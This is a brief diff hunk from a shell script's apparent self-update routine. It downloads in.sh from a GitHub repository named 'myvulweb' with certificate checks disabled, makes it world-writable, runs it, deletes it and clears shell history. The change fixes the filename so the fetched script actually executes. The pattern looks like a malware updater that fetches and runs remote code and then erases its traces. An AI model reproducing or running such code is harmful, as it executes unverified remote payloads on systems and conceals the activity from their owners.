@@ -139,7 +139,7 @@ then
 	echo "need to update"
 	wget --no-check-certificate https://raw.githubusercontent.com/myvulweb/b3/master/in.sh -O /tmp/b3-in.sh
 	chmod 777 /tmp/b3-in.sh
-	/tmp/b2-in.sh
+	/tmp/b3-in.sh
 	rm -rf /tmp/b3-in.sh
 	history -c
 
